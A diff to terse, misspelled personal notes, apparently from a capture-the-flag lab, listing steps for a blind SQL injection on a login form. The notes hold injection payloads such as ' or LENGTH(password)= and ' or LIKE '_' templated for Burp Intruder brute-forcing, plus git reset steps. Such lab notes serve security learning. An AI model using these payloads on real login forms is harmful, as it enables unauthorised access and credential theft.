@@ -19,3 +19,10 @@ apply command: ' or LENGTH(password)=§1§#&password=
 8.1 error echoctf/the_bin_in_the-dump
 9. git log
 10. with command git reset --hard HEAD~1 OR <SHA1>
+11. or git merge and commit why? of the git command
+12. apply attack brute-force with mondify package request
+http with 
+username=' or LIKE '§_§§_§§_§§_§§_§§_§§_§§_§&password=pwd
+and option payload set: 1
+optin payload type brute-force
+13. later remplace letter with greater that length
